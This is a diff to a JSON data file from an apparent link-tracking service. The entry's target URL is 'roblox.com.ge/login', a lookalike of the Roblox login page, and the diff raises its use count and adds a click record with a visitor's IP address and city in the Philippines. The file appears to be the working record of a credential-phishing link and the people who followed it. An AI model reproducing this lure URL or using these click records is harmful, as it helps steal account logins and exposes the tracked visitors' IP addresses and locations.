@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1435,
+    "useCount": 1436,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11646,6 +11646,14 @@
         "ip": "180.195.22.99",
         "country": "Philippines",
         "city": "Virac",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777430952638,
+        "ip": "49.146.53.19",
+        "country": "Philippines",
+        "city": "Koronadal",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
